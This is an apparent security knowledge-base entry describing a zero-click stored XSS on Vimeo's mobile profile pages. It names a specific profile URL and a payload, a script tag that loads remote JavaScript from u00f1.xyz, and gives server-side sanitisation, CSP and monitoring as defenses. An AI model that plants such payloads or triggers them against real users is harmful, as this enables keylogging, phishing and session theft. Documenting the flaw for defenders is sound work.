---
id: proc-vimeo-trigger-profile-xss
tags:
  - xss
  - execution
  - vimeo
  - mobile
  - automatic
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:40.003Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-on-Profile-Page

## Summary

This procedure loads a malicious profile on mobile web, automatically executing the injected script from the profile name without user interaction.

## Description

The payload in the profile name injects a <script> tag that loads and runs external JS on page render in the mobile interface, affecting locations like user profiles and follow lists. This enables silent attacks such as keylogging or phishing in the victim's session.

## Requirements

1. Malicious profile URL from setup
2. Mobile web browser to emulate victim access
3. Public profile visibility (no login required)

## Defense

Defensive measures and detection strategies:

- Validate and strip script tags from user profiles server-side
- Use strict CSP nonces for allowed scripts only
- Monitor traffic for loads from suspicious domains like u00f1.xyz

## Objectives

1. Achieve execution on page load
2. Verify script loading and action
3. Highlight zero-interaction risk

## Instructions

### Step 1: Access Profile on Mobile

**Context**: Render the profile page to trigger the injected script automatically.

Using the mobile web version of Vimeo, navigate to the profile URL, e.g., https://vimeo.com/user36690798.

### Step 2: Observe Execution

**Context**: The script executes on load; check for effects like alerts or network requests.

Page loads and the <script src=//u00f1.xyz> tag fires, executing the remote JS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- auto-execution
- profile-trigger
